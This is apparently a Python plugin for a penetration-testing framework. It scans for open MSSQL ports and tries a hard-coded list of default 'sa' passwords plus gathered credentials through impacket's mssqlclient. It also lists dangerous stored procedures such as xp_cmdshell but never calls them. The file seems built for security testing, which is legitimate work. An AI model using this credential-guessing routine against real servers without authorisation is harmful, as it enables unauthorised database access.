"""MSSQL exploitation â€” xp_cmdshell, linked servers, file read/write."""

from __future__ import annotations

import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

MSSQL_PORTS = [1433, 1434]

# Dangerous stored procedures to check
DANGEROUS_PROCS = [
    ("xp_cmdshell", "Command execution via xp_cmdshell"),
    ("xp_dirtree", "File system enumeration"),
    ("xp_fileexist", "File existence check"),
    ("xp_subdirs", "Subdirectory enumeration"),
    ("sp_oacreate", "OLE automation (COM object creation)"),
    ("xp_regread", "Registry read"),
]


class MssqlExploitPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="mssql_exploit",
        display_name="MSSQL Exploitation",
        category=PluginCategory.EXPLOITATION,
        description="xp_cmdshell, linked servers, file read/write, privilege checks",
        depends_on=["service_brute"],
        produces=["mssql_access", "credentials"],
        timeout=60.0,
        requires_http=False,
        risk_level="destructive",
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        findings: list[Finding] = []
        data: dict = {"accessible": False, "sysadmin": False, "procs": []}

        # Check if MSSQL port is open
        mssql_port = None
        if ctx.net:
            for p in MSSQL_PORTS:
                if await ctx.net.port_open(target.host, p, timeout=3.0):
                    mssql_port = p
                    break

        if not mssql_port:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("MSSQL ports not open", tags=["mssql"])],
            )

        findings.append(Finding.info(
            f"MSSQL service on port {mssql_port}",
            tags=["mssql"],
        ))

        # Try default credentials
        default_creds = [
            ("sa", ""), ("sa", "sa"), ("sa", "password"),
            ("sa", "Password1"), ("sa", "P@ssw0rd"),
        ]
        creds = ctx.state.get("credentials", [])
        all_creds = [
            {"username": u, "password": p} for u, p in default_creds
        ] + creds

        if ctx.subprocess_mgr:
            for cred in all_creds:
                if ctx.should_stop:
                    break
                result = await self._try_mssql_auth(
                    ctx, target.host, mssql_port, cred, findings, data,
                )
                if result:
                    break

        return PluginResult.success(
            self.meta.name, target.host, findings=findings, data=data,
        )

    async def _try_mssql_auth(
        self, ctx, host: str, port: int, cred: dict,
        findings: list[Finding], data: dict,
    ) -> bool:
        """Try MSSQL auth and enumerate if successful."""
        username = cred.get("username", "")
        password = cred.get("password", "")

        # Use impacket's mssqlclient if available
        result = await ctx.subprocess_mgr.run_impacket_tool(
            "mssqlclient.py",
            [f"{username}:{password}@{host}", "-port", str(port), "-windows-auth"],
            timeout=10.0,
        )

        if result.ok or "SQL>" in result.stdout:
            data["accessible"] = True
            findings.append(Finding.critical(
                f"MSSQL access with {username}:{password}",
                evidence=f"Login: {username}@{host}:{port}",
                description="Direct database access achieved",
                remediation="Change default credentials, restrict MSSQL access",
                tags=["mssql", "credential"],
            ))
            return True
        return False
